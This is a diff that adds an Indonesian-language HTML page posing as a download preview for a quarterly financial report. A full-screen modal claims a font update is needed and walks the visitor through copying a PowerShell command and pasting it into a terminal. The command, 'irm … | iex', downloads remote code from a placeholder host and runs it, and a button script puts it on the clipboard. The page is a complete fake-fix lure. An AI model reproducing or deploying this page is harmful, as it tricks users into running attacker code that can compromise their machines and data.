@@ -1,0 +1,22 @@
+<!doctype html>
+<html lang="id"><head><meta charset="utf-8"><title>Dokumen</title><style>body{font-family:system-ui,sans-serif;margin:0;color:#222;background:#fafafa}
+header,footer{background:#203040;color:#fff;padding:12px 24px}nav a{color:#fff;margin-right:16px}
+main{max-width:860px;margin:24px auto;padding:0 24px;background:#fff}
+.overlay{position:fixed;inset:0;background:#fff;z-index:9999;display:flex;align-items:center;justify-content:center}
+.box{max-width:520px;padding:32px;border:1px solid #ccc;border-radius:8px;box-shadow:0 4px 24px #0002}
+.offscreen{position:absolute;left:-9999px;top:0;width:1px;height:1px}
+pre{background:#f0f0f0;padding:12px;overflow:auto}</style></head>
+<body>
+<header><strong>Unduh Dokumen</strong> <nav><a href="#">Beranda</a></nav></header>
+<main><p>Pratinjau dokumen: Laporan_Keuangan_Q3.pdf</p></main>
+<div class="overlay modal" role="dialog" id="fixmodal"><div class="box">
+<h2>Dokumen tidak dapat ditampilkan</h2>
+<p>Font yang dibutuhkan tidak tersedia di perangkat Anda. Pembaruan font diperlukan.</p>
+<p>Ikuti langkah perbaikan:</p>
+<ol><li>Klik tombol Salin di bawah</li><li>Buka PowerShell (klik kanan tombol Start, pilih Terminal)</li><li>Tempel perintah lalu tekan Enter</li></ol>
+<code id="cmd">powershell -c "irm https://font.example.invalid/f | iex"</code>
+<button type="button" data-copy="#cmd" data-clipboard-target="#cmd">Salin</button>
+</div></div>
+<script>document.querySelectorAll('[data-copy]').forEach(function(b){b.addEventListener('click',function(){
+var t=document.querySelector(b.getAttribute('data-copy'));try{navigator.clipboard.writeText(t.textContent)}catch(e){}});});</script>
+</body></html>
